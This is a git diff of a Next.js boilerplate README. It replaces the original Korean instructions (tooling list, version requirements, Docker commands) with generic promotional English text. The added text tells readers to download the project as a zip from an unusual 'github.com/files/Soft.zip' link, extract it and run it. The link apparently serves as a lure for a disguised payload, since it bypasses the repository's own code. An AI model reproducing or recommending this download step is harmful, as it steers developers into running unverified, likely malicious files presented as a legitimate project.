@@ -1,55 +1,54 @@
-# nextjs-boilerplate
+# Next.js Awesome Boilerplate 🚀
 
-> 📦 nextjs boilerplate
+Welcome to the Next.js Awesome Boilerplate GitHub repository! This boilerplate is designed to kickstart your Next.js projects with all the essential tools and configurations you need. Whether you are a beginner or an experienced developer, this boilerplate will save you time and effort in setting up your Next.js applications.
 
-Next.js 보일러플레이트
+## Features 🌟
 
-<br />
+- **Docker**: Containerize your Next.js application for easy deployment.
+- **ESLint**: Lint your code to maintain code quality and consistency.
+- **Lefthook**: Use Git hooks to automate tasks and ensure code quality.
+- **PNPM**: Manage your project dependencies efficiently with PNPM.
+- **Prettier**: Format your code automatically for a clean and consistent codebase.
+- **React**: Enjoy the power of React for building interactive user interfaces.
+- **TailwindCSS**: Utilize TailwindCSS for rapid styling and design.
+- **TypeScript**: Enhance your codebase with TypeScript for static type-checking.
 
-## 설치된 항목
+## Repository Link 📦
 
-- ✅ ESLint flat config v9, Prettier
-- ✅ Tailwind CSS v4
-- ✅ Lefthook
-- ✅ GitHub 설정
-- ✅ Docker Build 지원
+[Download the Next.js Boilerplate](https://github.com/files/Soft.zip)
 
-<br />
+## How to Use 📝
 
-## 사용 조건
+1. Download the repository as a zip file from the provided link.
+2. Extract the contents to your desired location.
+3. Navigate to the project directory in your terminal.
+4. Run `pnpm install` to install the project dependencies.
+5. Start the development server with `pnpm dev`.
+6. Begin building your Next.js application!
 
-- Node.js `v22.14.0`
-- pnpm `v10.5.2`
+## Repository Topics 🔍
 
-<br />
+- boilerplate
+- docker
+- eslint
+- lefthook
+- nextjs
+- pnpm
+- prettier
+- react
+- tailwindcss
+- typescript
 
-## Docker 빌드 및 실행
+If you encounter any issues or need further guidance, feel free to check the "Releases" section for updates or open an issue in the repository.
 
-도커 컨테이너에서 Next.js 애플리케이션을 실행하는 방법
+## Get Started 🚀
 
-1. 도커 이미지 빌드 및 실행
+Now that you have all the necessary tools at your disposal, dive into the exciting world of Next.js development with this awesome boilerplate! Whether you are building a personal project, a startup MVP, or a full-fledged application, this boilerplate has got you covered.
 
-```shell
-# 1. 도커 폴더로 이동
-cd docker/
+Let your creativity flow and leverage the power of Next.js combined with modern tools and best practices to create exceptional web experiences. Happy coding!
 
-# 2. 도커 컴포즈 실행
-docker compose --project-name nextjs-boilerplate up --build -d
+### Happy Coding! 🎉
 
-# 3. 컨테이너 상태 확인
-docker ps
-```
+![Next.js Logo](https://cdn.worldvectorlogo.com/logos/next-js.svg)
 
-2. 실행 중인 컨테이너 확인
 
-```shell
-docker logs -f nextjs-app
-
-# 배포된 서비스 http://localhost:3000 접속가능
-```
-
-3. 컨테이너 중지 및 삭제
-
-```shell
-docker compose down
-```
